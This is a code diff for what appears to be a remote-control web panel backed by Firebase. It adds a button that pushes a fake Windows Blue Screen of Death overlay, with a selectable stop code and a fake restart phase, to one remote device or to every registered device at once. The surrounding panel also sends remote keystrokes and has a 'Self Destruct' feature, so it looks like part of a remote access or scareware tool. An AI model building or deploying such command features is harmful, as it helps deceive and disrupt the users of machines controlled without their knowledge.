@@ -199,6 +199,31 @@ header{
 
 @media(max-width:820px){.layout{grid-template-columns:1fr;}}
 
+/* ── BSOD CARD ── */
+.bsod-card{border-color:#003a6a !important;}
+.bsod-card .ch{color:#4dc3ff !important;border-bottom-color:#003a6a !important;background:#040d17 !important;}
+.btn-bsod{
+  width:100%;padding:9px;font-size:.78rem;letter-spacing:2px;
+  background:transparent;border:1px solid #0078d7;color:#4dc3ff;
+  font-family:'Share Tech Mono',monospace;cursor:pointer;border-radius:2px;
+  transition:all .15s;
+}
+.btn-bsod:hover{background:#0078d7;color:#fff;box-shadow:0 0 18px #0078d780;}
+.bsod-select{
+  width:100%;background:#040d17;border:1px solid #003a6a;
+  color:#4dc3ff;font-family:'Share Tech Mono',monospace;font-size:.65rem;
+  padding:6px 8px;border-radius:2px;outline:none;
+}
+.bsod-select:focus{border-color:#0078d7;}
+.bsod-row{display:flex;gap:6px;align-items:center;}
+.bsod-num{
+  width:64px;background:#040d17;border:1px solid #003a6a;
+  color:#4dc3ff;font-family:'Share Tech Mono',monospace;font-size:.7rem;
+  padding:6px 7px;border-radius:2px;outline:none;text-align:center;
+}
+.bsod-num:focus{border-color:#0078d7;}
+.bsod-lbl{font-size:.58rem;color:var(--muted);letter-spacing:1px;white-space:nowrap;}
+
 /* ── SELF DESTRUCT ── */
 .destruct-card{border-color:#3a0010 !important;}
 .destruct-card .ch{color:#ff3355 !important;border-bottom-color:#3a0010 !important;background:#0d0008 !important;}
@@ -364,6 +389,46 @@ header{
         <button class="btn bg sm" onclick="rKey('a','ctrl')">Ctrl+A</button>
         <button class="btn bg sm" onclick="rKey('enter')">Enter</button>
         <button class="btn bg sm" onclick="rKey('space')">Space</button>
+      </div>
+    </div>
+
+    <!-- BSOD -->
+    <div class="card bsod-card">
+      <div class="ch">// 💀 BSOD Overlay</div>
+      <div class="qa" style="gap:7px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:.6rem;color:#2a5580;line-height:1.7;padding:2px 0 2px;">
+          Windows Blue Screen of Death dikhao.<br>
+          2-phase: Error screen → Restarting screen
+        </div>
+
+        <select class="bsod-select" id="bsod-stopcode">
+          <option value="">— Random Stop Code —</option>
+          <option>CRITICAL_PROCESS_DIED</option>
+          <option>SYSTEM_THREAD_EXCEPTION_NOT_HANDLED</option>
+          <option>IRQL_NOT_LESS_OR_EQUAL</option>
+          <option>MEMORY_MANAGEMENT</option>
+          <option>PAGE_FAULT_IN_NONPAGED_AREA</option>
+          <option>KERNEL_SECURITY_CHECK_FAILURE</option>
+          <option>DPC_WATCHDOG_VIOLATION</option>
+          <option>UNEXPECTED_KERNEL_MODE_TRAP</option>
+          <option>WHEA_UNCORRECTABLE_ERROR</option>
+          <option>BAD_POOL_HEADER</option>
+        </select>
+
+        <div class="bsod-row">
+          <span class="bsod-lbl">Phase 1 (sec)</span>
+          <input class="bsod-num" id="bsod-p1" type="number" value="300" min="5" max="3600"/>
+          <span class="bsod-lbl">Phase 2 (sec)</span>
+          <input class="bsod-num" id="bsod-p2" type="number" value="300" min="5" max="3600"/>
+        </div>
+
+        <button class="btn-bsod" onclick="sendBSOD()">
+          💀 &nbsp;TRIGGER BSOD
+        </button>
+        <button class="btn-bsod" style="border-color:#002255;color:#2a5580;font-size:.68rem;"
+                onclick="sendBSODAll()">
+          💀 BSOD ALL DEVICES
+        </button>
       </div>
     </div>
 
@@ -682,6 +747,51 @@ function toast(msg,good=true,err=false){
   _tt=setTimeout(()=>el.classList.remove("show"),2600);
 }
 
+
+// ── BSOD ──────────────────────────────────────────────────
+function getBSODParams() {
+  return {
+    stopcode:   document.getElementById("bsod-stopcode").value || null,
+    phase1_sec: parseInt(document.getElementById("bsod-p1").value) || 300,
+    phase2_sec: parseInt(document.getElementById("bsod-p2").value) || 300,
+  };
+}
+
+function sendBSOD() {
+  if (!viewingDevice) { toast("Device select karo pehle!", false, true); return; }
+  const p = getBSODParams();
+  set(ref(db, `commands/${viewingDevice}`), {
+    action:     "bsod",
+    phase1_sec: p.phase1_sec,
+    phase2_sec: p.phase2_sec,
+    stopcode:   p.stopcode,
+    timestamp:  new Date().toISOString()
+  }).then(() => {
+    log(`💀 BSOD → ${viewingDevice} | ${p.stopcode||"random"} | ${p.phase1_sec}s+${p.phase2_sec}s`, "er");
+    toast(`💀 BSOD → ${viewingDevice}`);
+  }).catch(e => { log("BSOD err: "+e.message,"er"); toast(e.message,false,true); });
+}
+
+async function sendBSODAll() {
+  const snap = await get(ref(db, "devices"));
+  const ids  = Object.keys(snap.val() || {});
+  if (!ids.length) { toast("Koi device nahi!", false, true); return; }
+  const p = getBSODParams();
+  for (const id of ids) {
+    await set(ref(db, `commands/${id}`), {
+      action:     "bsod",
+      phase1_sec: p.phase1_sec,
+      phase2_sec: p.phase2_sec,
+      stopcode:   p.stopcode,
+      timestamp:  new Date().toISOString()
+    });
+  }
+  log(`💀 BSOD ALL → ${ids.length} devices`, "er");
+  toast(`💀 BSOD → ${ids.length} devices`);
+}
+
+window.sendBSOD    = sendBSOD;
+window.sendBSODAll = sendBSODAll;
 
 // ── Self Destruct ─────────────────────────────────────────
 let _destructTarget = null;   // null = single device, "ALL" = sabhi
